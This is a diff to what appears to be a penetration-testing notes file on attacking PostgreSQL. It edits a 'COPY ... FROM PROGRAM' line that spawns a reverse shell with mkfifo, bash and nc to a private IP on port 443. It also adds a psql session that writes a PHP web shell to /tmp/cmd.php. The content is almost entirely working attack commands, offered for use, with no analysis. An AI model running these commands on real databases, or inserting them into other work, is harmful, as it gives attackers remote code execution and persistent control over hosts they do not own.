@@ -14,7 +14,26 @@ SELECT * FROM cmd_exec;
 DROP TABLE IF EXISTS cmd_exec;
 
 
-COPY cmd_exec FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.238 443 >/tmp/f';
+COPY cmd_exec FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.178 443 >/tmp/f';
+```
+
+```bash
+postgres=# DROP TABLE pwn;
+DROP TABLE
+postgres=# CREATE TABLE pwn (t TEXT);
+CREATE TABLE
+postgres=# INSERT INTO pwn(t) VALUES ('<?php @system("$_GET[cmd]");?>');
+INSERT 0 1
+postgres=# SELECT * FROM pwn;
+               t                
+--------------------------------
+ <?php @system("$_GET[cmd]");?>
+(1 row)
+
+postgres=# COPY pwn(t) TO '/tmp/cmd.php';
+COPY 1
+postgres=# DROP TABLE pwn;
+DROP TABLE
 ```
 
 ```python
